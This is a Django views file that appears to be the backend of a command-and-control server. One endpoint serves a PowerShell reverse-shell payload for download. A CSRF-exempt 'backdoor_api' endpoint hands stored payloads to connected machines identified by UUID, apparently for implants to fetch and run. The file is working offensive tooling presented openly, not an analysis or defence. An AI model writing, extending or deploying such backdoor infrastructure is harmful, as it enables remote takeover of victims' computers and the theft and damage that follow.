from django.shortcuts import render
from django.http import HttpResponse, FileResponse
from django.utils.encoding import smart_str
from mimetypes import guess_type
from rest_framework import status
from rest_framework.decorators import api_view
from rest_framework.response import Response
from django.views.decorators.csrf import csrf_exempt
from connections.models import Connection, TempData


def download_payload(request):
    file_path = './payloads/Reverse_Shell.ps1'
    with open(file_path, 'rb') as f:
        response = HttpResponse(f, content_type=guess_type(file_path)[0])
        response['Content-Disposition'] = 'attachment; filename=Reverse_Shell.ps1'
        response['Content-Length'] = len(response.content)
        return response


# TODO CSRF is a security RISK use this only for testing powershell with REST API AND REMOVE AFTERWARDS
@csrf_exempt
@api_view(['GET', 'POST'])
def any_rest_api(request):
    if request.method == 'GET':
        print(f'GET IS: {request.GET}')
        return Response(request.GET)

    elif request.method == 'POST':
        print(f'POST IS: {request.POST}')
        return Response(request.POST)


@csrf_exempt
@api_view(['GET', 'POST'])
def backdoor_api(request, uuid):
    if request.method == 'GET':
        try:
            connection = Connection.objects.get(uuid=uuid)
            data = TempData.objects.get(connection_id=connection)
            this = {'active': True, 'uuid': str(data.connection_id.uuid).upper(), 'payload': data.input,
                    'payload_name': data.payload_name}
        except:
            this = {'active': False, 'uuid': 'None'}
        return Response(this)

    if request.method == 'POST':
        print(f'POST IS: {request.POST}')
        return Response(request.POST)